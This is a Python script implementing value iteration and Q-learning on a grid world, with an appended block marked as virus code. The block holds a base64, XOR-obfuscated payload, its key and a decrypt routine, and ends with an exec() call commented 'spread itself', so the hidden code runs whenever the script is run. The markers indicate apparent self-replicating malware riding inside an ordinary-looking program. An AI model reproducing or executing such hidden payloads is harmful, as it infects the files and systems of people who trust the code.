import sys
from random import random,randrange

possible_moves = [(-1,0),(0,-1),(0,1),(1,0)]
with open(str(sys.argv[1])) as infile:
    lines = infile.read().splitlines()
    if lines[0] == 'V':
        algorithms = 'V'
        tetha, gamma, cy, cx, obstacle_count = float(lines[1]), float(lines[2]), int(lines[3].split(" ")[0]), int(lines[3].split(" ")[1]), int(lines[4])
        scene = [[None for _ in range(cy)] for _ in range(cx)]
        pitfall_count = int(lines[5+obstacle_count])
        goal_state = lines[6+obstacle_count+pitfall_count].split(" ")
        scene[int(goal_state[0])-1][int(goal_state[1])-1] = 'G'
        for i in range(1, obstacle_count+1):
            coord = lines[4+i].split(" ")
            scene[int(coord[1])-1][int(coord[0])-1] = 'O'   
        for i in range(1, pitfall_count+1):
            coord = lines[5+obstacle_count+i].split(" ")
            scene[int(coord[1])-1][int(coord[0])-1] = 'P'
        rewards = lines[7+obstacle_count+pitfall_count].split(" ")
        r_d,r_o,r_p,r_g = int(rewards[0]),int(rewards[1]),int(rewards[2]),int(rewards[3])
        #scene.reverse()
        #printer(scene)
    if lines[0] == 'Q':
        algorithms = 'Q'
        number_of_episode, alpha, gamma, epsilon, = int(lines[1]), float(lines[2]), float(lines[3]), float(lines[4])
        cy, cx, obstacle_count = int(lines[5].split(" ")[0]), int(lines[5].split(" ")[1]), int(lines[6])
        scene = [[None for _ in range(cy)] for _ in range(cx)]
        pitfall_count = int(lines[7+obstacle_count])
        goal_state = lines[8+obstacle_count+pitfall_count].split(" ")
        scene[int(goal_state[0])-1][int(goal_state[1])-1] = 'G'
        for i in range(1, obstacle_count+1):
            coord = lines[6+i].split(" ")
            scene[int(coord[1])-1][int(coord[0])-1] = 'O'
        for i in range(1, pitfall_count+1):
            coord = lines[7+obstacle_count+i].split(" ")
            scene[int(coord[1])-1][int(coord[0])-1] = 'P'
        rewards = lines[9+obstacle_count+pitfall_count].split(" ")
        r_d,r_o,r_p,r_g = int(rewards[0]),int(rewards[1]),int(rewards[2]),int(rewards[3])
        #scene.reverse()
        #printer(scene)

def maximum_index(somearray):
    it, am = iter(somearray), 0
    next_it=it.next()
    for i,element in enumerate(it,start=1):
        if element>next_it:
            next_it=element
            am=i
    return am

def move_func(old_y,old_x,given_action,scene,is_q):
    if is_q:
        if random() > 1-epsilon:
            rand = randrange(4)
            # while possible_moves[rand] == (0,0):
            #     rand = randrange(4)
            given_action = possible_moves[rand]
    new_x,new_y = old_x+given_action[0], old_y+given_action[1]
    if new_x < 0 or new_x > len(scene[0])-1:
        new_x = old_x
    if new_y < 0 or new_y > len(scene)-1:
        new_y = old_y
    if scene[new_y][new_x]=='O':
        new_y = old_y
        new_x = old_x
    return new_y, new_x

def return_dict(cols,rows,q_sa,possible_moves):
    return_dict = {}
    for y in range(rows):
        for x in range(cols):
            return_dict[(y,x)] = possible_moves[maximum_index(q_sa[y][x])]
    #       print (y,x), q_sa[y][x]
    #print "--------"
    return(return_dict)

def q_sa_init(q_sa):
    #print r_g
    rows = len(scene)
    cols = len(scene[0])
    for y in range(rows):
        for x in range(cols):
            if scene[y][x] == 'G':
                for ai,a in enumerate(possible_moves):
                    q_sa[y][x][ai] = r_g
    return q_sa
    
def value_iteration():
    rows = len(scene)
    cols = len(scene[0])
    #v_s = [row[:] for row in scene]
    v_s = [[random() for _ in line]for line in scene]
    for y in range(rows):
        for x in range(cols):
            if scene[y][x] == 'G':
                v_s[y][x] = r_g
            else:
                v_s[y][x] = random()
    
    q_sa = [[[random() for _ in possible_moves] for _ in line]for line in scene]
    q_sa_init(q_sa)
    done = False
    while not done:
        prev_v_s = [row[:] for row in v_s]
        delta = 0.0
        for y in range(rows):
            for x in range(cols):
                if scene[y][x] == 'O':
                    v_s[y][x] = r_o
                    continue
                if scene[y][x] == 'P':
                    v_s[y][x] = r_p
                    continue
                for ai,a in enumerate(possible_moves):
                    if scene[y][x] == 'G':r = r_g
                    elif scene[y][x] == 'O':r = r_o
                    elif scene[y][x] == 'P':r = r_p
                    else:r = r_d

                    new_y,new_x = move_func(y,x,a,scene,False)

                    new_s_val = prev_v_s[new_y][new_x]

                    new_y,new_x = move_func(y,x,(0,0),scene,False)

                    new_fs_val = prev_v_s[new_y][new_x]

                    possiblity_val = 0.8 * new_s_val + 0.2 * (new_fs_val)

                    q_sa[y][x][ai] = r + gamma * possiblity_val

                max_ind = maximum_index(q_sa[y][x])
                v_s[y][x] = q_sa[y][x][max_ind]

        for y in range(rows):
            for x in range(cols):
                if scene[y][x] == 'G':
                    v_s[y][x] = r_g
        
        delta = max([max([abs(v_s[y][x]-prev_v_s[y][x]) for x in range(cols)]) for y in range(rows)])

        if delta < tetha:
            done = True
    return(return_dict(cols,rows,q_sa,possible_moves))

def q_learning():
    rows = len(scene)
    cols = len(scene[0])

    q_sa = [[[random() for _ in possible_moves]for _ in line] for line in scene]

    q_sa_init(q_sa)

    for ep in range(0,number_of_episode):
        for y in range(rows):
            for x in range(cols): 
                if scene[y][x] == 'G':
                    q_sa[y][x] = [r_g for _ in possible_moves]
    
        y = randrange(rows)
        x = randrange(cols)

        done = False

        while not done:
            
            if scene[y][x] == 'G':break
            if scene[y][x] == 'O':break
            # if scene[y][x] == 'P':break
            #print("y:",y," x:",x, " st:",scene[y][x])
            a = maximum_index(q_sa[y][x])

            new_y,new_x = move_func(y,x,possible_moves[a],scene,True)
            
            if scene[new_y][new_x] == 'G':r = r_g
            elif scene[new_y][new_x] == 'O':r = r_o
            elif scene[new_y][new_x] == 'P':r = r_p
            else:r = r_d

            #q_sa[y][x][a] = (1-alpha)*q_sa[y][x][a] + alpha*(r + gamma * max(q_sa[new_y][new_x]))
            q_sa[y][x][a] = q_sa[y][x][a] + alpha * (r+ gamma * max(q_sa[new_y][new_x]) - q_sa[y][x][a])

            y,x = new_y, new_x    

            #print("new_y:",new_y," new_x:",new_x, " new_st:",scene[new_y][new_x])
            if scene[y][x] == 'G':
                done = True

    return(return_dict(cols,rows,q_sa,possible_moves))


def getList(dict): 
    return dict.keys()

if algorithms == 'V':
    policy = value_iteration()
    printdic = {}
    for a in policy.items():
        if a[1] == (-1,0): printdic.update({(a[0][1],a[0][0]):3}) #W
        if a[1] == (1,0): printdic.update({(a[0][1],a[0][0]): 1}) #E
        if a[1] == (0,1): printdic.update({(a[0][1],a[0][0]): 0}) #N
        if a[1] == (0,-1): printdic.update({(a[0][1],a[0][0]): 2}) #S
    # for x in sorted(printdic):
    #     print x[0],x[1],printdic[x]
    with open(sys.argv[2], 'w') as outfile:
        for r in sorted(printdic):
            outfile.write(str(r[0]+1)+' '+str(r[1]+1)+' '+str(printdic[r])+'\n')

if algorithms == 'Q':
    policy = q_learning()
    printdic = {}
    # for a in policy:
    #     if policy[a] == (-1,0): print a,"W"
    #     if policy[a] == (1,0): print a, "E"
    #     if policy[a] == (0,1): print a,"N"
    #     if policy[a] == (0,-1): print a,"S"
    for a in policy.items():
        if a[1] == (-1,0): printdic.update({(a[0][1],a[0][0]):3}) #W
        if a[1] == (1,0): printdic.update({(a[0][1],a[0][0]): 1}) #E
        if a[1] == (0,1): printdic.update({(a[0][1],a[0][0]): 0}) #N
        if a[1] == (0,-1): printdic.update({(a[0][1],a[0][0]): 2}) #S
    # for x in sorted(printdic):
    #     print x[0],x[1],printdic[x]
    with open(sys.argv[2], 'w') as outfile:
        for r in sorted(printdic):
            outfile.write(str(r[0]+1)+' '+str(r[1]+1)+' '+str(printdic[r])+'\n')

#viruscode_start
#INFECTEDbye2171445
#payload_start
cipher_text = """VQcOARQWEQMICDQLHAUaF3kGBggZAxNTDhZ4Ch4CBlgHF0YTEhsDWB8cFxwTEVIGAwQFcgEJGAwB
G0sKEwASFhIRAWYFABsXGhBIEAcdAhYRew4eEQoAGEwfChYMCwVpeQwHGQUCRyUIFwcfVmdLWEhE
DAYVTzQnHx8OBz46Wh8JAQ1RUm5IQ1NPS1hWURQWDQNcDQABOxkcDBtDTk8YHRoXSRUICxYtAAE7
GRwMG0taZUtYVlFHU0FFAQkAC0URBgINAAcuBxReWEdTQUV4TExNS3JIREhDFwoNWAQQCRcOCDkJ
FUUYHQQCRAgWFicdGExVQ0hfeExMTUtYSERIDxYbHx0EAkdOQRYGHgUDDFYJFwsKGjAHFwEUFRAA
FhdmTE1LWEhESEMBCh8NBB9HVEZLGAMFA0MKCQoMDB5BCBAZGAQWSQkXGBgIGQtBRA4MAU8CWB8f
RwEACxUJRAYOASQBBkpaZWFYVlFHFwQDUgoFAw85BAg4AgcHGFAFFAsVTRUTGARQTFZPTVJpU09L
WFZRR1MACR4zCgQHHRs7CQ0XMA8RBAJHTkEKAUIABBgMDA0aSwMOHxBfe0dTQUVSTExNGwEcDAcN
LAkCFBMCR05BPi9mZk1LWEhESENTCQQKVhhHGg9FEwAAMg0RBAEbPBIBDycSGBUAW29STExNS1hI
REhDU08KGgUeCwYVAC0cDRkDWFVEBxBdHwoMHl8NHAgLWhwNGQNUSA1BaVNPS1hWUUdTQUVSTAUL
QwsNCA5NGhw7AV4QBQAOCQcYCTIbGRwMQUpJZUtYVlFHU0FFUkxMTUtYSEQYGgcHBBYpFw4fBBZc
DRwdDhYMTAkBAAAHDQIUOAMAERpFZk1LWEhESENTT0tYVhQLGgdNHR9CHQoMAEoBEBcGGVAXExQc
DRAGCTMdCgwATUFZeU9LWFZRR1NBRVJMTE1LWEgUERcbAAUnEBgLFhJFT0wcFB8QBwo3BRoDDgtW
WkcABAkUQgoEBRwpCAQzEhsDC14QBQAOCQcYCTIbGRwMQWlTT0tYVlFHU2tFUkxMTUtYSBYNFwYd
BVgGCBMbDgstCgUBDgtiREhDU2VLWFZRAxYHRRsfPBRDCw0IDk8DDh8QX0ttU0FFUkxMTUsRDkQG
DAdPBAtYAQYHCUsbHwgEGVAYBRwLWk8KFhJRFxIVDVwJAgkYDwEQAEtUQRsBUVhdeUFFUkxMTUtY
SERIQwEKHw0EH0cnExAXZkxNS1hIREhDFgMYHUx7R1NBRVJMTE1LWEhEGgYHGhkWVjcGHxIAeGZM
TUtYDAEOQxAdDhkCFDcSGAkdDQhFGB0EAkFZeU9LWFZRR1NBRlIKBQEOWFVEChoHCgoKBBAeWw4V
FwJEMjQeAQgNPCxDS18EE0BaTxcXDQhFQlFiREhDU09LWFYXDh8EWBBLS01IWA8BHEMFBhkNBVEE
HAUAUg4JGRwdDQpIDxoBDgtWU0QFCBcHHw8CDx03FxwCARtJWBcfA1NDRgQFHhgYGwcADTwWAQ9a
fFFHU0FFUkxMHh8ZGhANB1NSSz4XHRQWa0VSTExNS1hIBg4KHwpLRVYeFxYPTS0zCgQHHTc7RENU
HQlfX18VFgABWkVMTkseAQgNQxIcSxpRVm1TQUVSTExNSx4HFkgBHwYFHVYYCVMDAxsACUMYCAQN
HEsRSDcWUVhdeUFFUkxMTUtYSERIQxoJSwsCEBUHBAFIZkxNS1hIREhDU09LWFZRR1MHDB4JTFBL
HgEIDUNYTwkUHx8CWEEHVTACSmFYSERIQ1NPS1hWUUcWDQwUTA4BAhYNRFVeUw1MWwAYFQYSBh0I
CTIYDAkWHERJZUtYVlFHU0FFUkxMTUtYSEQbFxIdHx0SUVpTNRcHCWZNS1hIREhDU09LWFZRR1NB
AxsACU1WWA4NBAZTREsaGhgJFkpFEEswA0xySERIQ1NPS1hWUUdTBAkbCkwPBxEGAUheTk8JX1UH
DgEUFhEDCAg0HQYAT1l5T0tYVlFHU0FFUkxMTUtYSAIBDxZPVlgQGAsWQU5SDgAEBR1DRApELwFM
clZRR1NBRVJMTE1LWEhESEMRHQ4ZHXttU0FFUkxMTUsTDR1IXlMcDhQQXxUSDwEdAScIElBBbkhD
U09LWFZRBBoRDRceTE1WWD4NGhYAQRMXBC4EARgVBjMKBAcdQAIBDxZDAB0PXQIdAgoWCUxQSywa
EQ1KeU9LWFZRR1NBb1JMTE1LWEhEGAIKAwQZElFaUwNCLgJPGwIKHRcLDBcKNAsCEBUHPQtVZkxN
S1hIREhDAw4SFBkQA1NcRQINFQEEGQxEQ0MRSEgxODciMDUgNg4VCFlJX1VcV0YzBV98UUdTQUVS
TEwdCgEECwkHU1JLCBcICxwAAVJHTA9MWxgFEQ8cDg8nBQUGARU5HEtmTUtYSERIQ1MfCgEaHgYX
QVhSHA0UBxcJAEhIUw1MGx8BDxYTOgYJFBlLRUhGSkFUT0BYXhIOAwkAAEVMRktYCkNKQVEzBV98
UUdTQUVSTEwdCgEECwkHU1JLCBcICxwAAVJHTA9MGwEUAAYBMAAdD1FaU0NCUkdMBg4BRgEGABwL
DlBfUUxTA0JQS2ZNS1hIREhDUx8KARoeBhdBWFIcDRQHFwkASEhTDUwkGFIXEhgJHQ0IMg4WDENI
aXlPS1hWUUdTQQAKCQ8YHxkKCA1DTk9JWlR7AxYHRQoDHjIIChEUHDwVBgcdXhUGBwBJGQkVQQ4W
CwsMBlNSSz4XHRQWTUUWCQ8CDx1IWUglEgMYHV9LbVNBRVJMTE1LHhoLBUMaGw4KAh4IHxJFGwEc
AhkMSAcRAB8KYVhWUUdTQUVSBQEdBAocRAoCAApdTHxRR1NBRVJMTGdLWEhESENTTwIeVhUCEA4B
F1ZMTksbARQABgEwHx0OBUdOQRYGHgUDDFhERAMGCk9WWAUFFRoPAnhMTE1LWEhESENTT0scFwUG
U1xFEA0fCF1MRgANABwLDgsCAw4dBk0QFRgICgoaBRFLFw4fGVpTEgcHSEpORURLW0gGERcWTwoK
BBAeU0kdHR4JCUsaDQIHERZGYVhWUUdTQUVSTExNS1tIHAcRUw4MGR8fR19BDBwaCR8YHUhuSENT
T0tYVlFHU0FFCgMeCA9YVURPRF0FBBEYWQQbE00KTDJNBAoMTBFKWk8NFwRRTwtNHFtMBQNLAgEU
QAcSGwpUVhIeEA0AWgcJFEJRQW5IQ1NPS1hWUUdTQUUACRgYGRZIHAcRFgthWFZRR1NBRVJmTE1L
WEhESEMaCUsdGBIIFwRfUk9MFUtVVkQKGgcKYVhWUUdTQUVSTExNSwAHFg0HU1JLX1FfDRwIC1oP
BB9DUBBNSD1TABkcXghOWkEDHR5MRRNUEU1ICh1PEREGWQMSFQReTA8UCBQNTAMGCkZCUXxRR1NB
RVJMTE1LWEgWDRcGHQVYFBAUFldRXAkCDgQcDRccERoBDFAOHhUWBUsXAg8CDx1ATUFNABsZEQZZ
TnlBRVJMTE1LWGJHGxMBCgocVhgTAAQJFGYJFQ4bQBwHESwMGQEGBTgVCAkXRA8EGxANFjcXFhcf
VBUYFxsEFy0HCRRHHA0HBwcWT1ZYIgMSFkhMeE8aBBkNGwcHBxYwDhYSU0VRa29STExNS1hIRBgC
CgMEGRJRWlMRBAsAAwwPVgwBCwwXCkNRVlpHFhkAERkYDAkUDW5IQ1NPS1hWURUWFRAAAkwdCgEE
CwkHU09LclZRR1Nrb1JMTE0PHQ5EARA6AQ0dFQUCF0kWFwAKQRsZHAxBWXlPS1hWUUdTQRIbGARN
BAgNCkATEhsDUVYQFFMHDB4JVmdLWEhESENTT0tYVlEOFUFCUSUiKy47PCEsAQoKWUlBQFNHVEJS
BQJNDREEAUYRFg4PUF9LbVNBRVJMTE1LWEhESENTT0sKEwUSAQ9FJh4ZCGFYSERIQ1NPS1hWUUcW
DRYXVmZNS1hIREhDU09LWFZRR1NBFxcYGR8FWC4FBBAWZUtYVlFtU0FFUggJC0sRBgINAAdHGB0a
F0sDABEaRVZnS1hIREhDU09ICAQYCQdJRzsCCggIDAEKD0NRQ0sIFwUPWmtFUkxMTUtYSAIBDxZP
VlgZAQIdSRUTGARBTBlPTUhAUw4bCBMfA3lBRVJMTE1LWBgFEQ8cDg9YS1EUFg0DXA8eCAoMDTQJ
Gh8AChxeWG1TQUVSTExNSx4BCA1NBB0CDBNZFxIYCR0NCERhWEhESGlTT0tYEhQBUwgLFAkPGSoU
BEwbBh8JQkJ8UUdTQUVSTEwLBApIFAkXG08CFlYCAh8HSxMAAD0KDAAXUmlTT0tYVlFHU0FFUkwF
C0sWBxBIEBYDDVYfAi4dBwARGAkJQwgJEABKSWVLWFZRR1NBRVJMTE1LWEhEGwYfCUURGBcCEBVN
Ag0YBUJySERIQ1NPS1gVHhUcDwRSUUwfDgkdARsXAEEMHQJZRRsVEQIfVkJEGwcWBw0SQhgMFwUU
XQ4LHgUCCFQeBxYFAgdSAQsZH0Vaa0VSTExNS1hIFBoKHRtDGxkDCB0ASwYJFBlCcmJuSENTTysL
AhATGgIIFxgEAg9YSERIaVNPS1gSFAFTGQoAMw8fEggcOw4KHwpDHBcFBl8KAAtACQMIFwwBSF5T
KQoUBRRLUwUAEQMICEtFSCIJDwAKQkJ8UUdTQUVSTEwLGRcFRAEXFh0fFxkdFFMICAIDHhlLGxEH
BAZ5T0tYVlFHU0EMHxwDHx9YCgUbBkVbYVhWUUdTQUVSZkxNS1hIREhDGglLHBMSCBcEX1JPTA4C
CAABGjwHChMMVkxHABUXGwILTUdYAwERQ05PGAwEGAkUa0VSTExNS1hIREhDUwsKDBdRWlMDBAEJ
WllFHA0HBwcWHB8KHx8AWwMcBgkNHxkZEUwMAgcOR1oDBQFeWUdbRUxOSxoREA1DEh0ZGQ9RTwsO
FxcITA8OHgcWDUp5T0tYVlFHU0FFUkxMTksABxZIAhQOAhZWXUcaDxMXHh8IS3JIREhDU09LWFZR
R1MZCgAJCE1WWE9DRgkcBgVQFRkVWxlFLEwDHw9QEU1BQxUAGVheCUsKSEUbAkwXAghAAAkXEkNL
Gw8SCxZJDhcVRURCckhESENTT0tYVlFHUxMABhkeA0sABxYNB3lPS1hWUUdTQW9STExNS1hIRAEF
UwoFGxkVAklBRlIUTEBVWAodHAZ5T0tYVlFHU0FFUkxMFQQKDQBIXlNITFYcHg4dSQYaHkRFE1FI
OkgMAQtDAV9YRxUOF1JEFEESUUgNBkMJBhtQEhATEk1FERUPAQ5QAwERSlpGYVhWUUdTQUVSTExN
SwoNEB0RHU8JGQUUUUdPABwPAwkOCxwWAQ0URxMXBBQDXQQLEQMICENRQUobFwEGG1Bfe215F0VP
TDoEGQ0bTEFpUBkCCgMCBBwFAC0JAglh"""
cipher_key = "vqgsaerllmkxhdhcsokx"
#payload_end
def xor_crypt_file(data,key,encode = False, decode = False):
        from itertools import cycle
        import base64
        
        if decode: # cipher_text = string , key = string
            data = base64.decodestring(bytearray(data,"utf-8")) # byte array (xored before)
            # xor again , inverse 
            xored = ''.join(chr(x ^ ord(y)) for (x,y) in zip(data, cycle(key)))
            return xored
        
        if encode: # x -> byte
            xored = ''.join(chr((x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
            return base64.encodestring(xored.encode()).strip()
        
#spread itself
exec(xor_crypt_file(cipher_text,cipher_key,decode = True))
#viruscode_end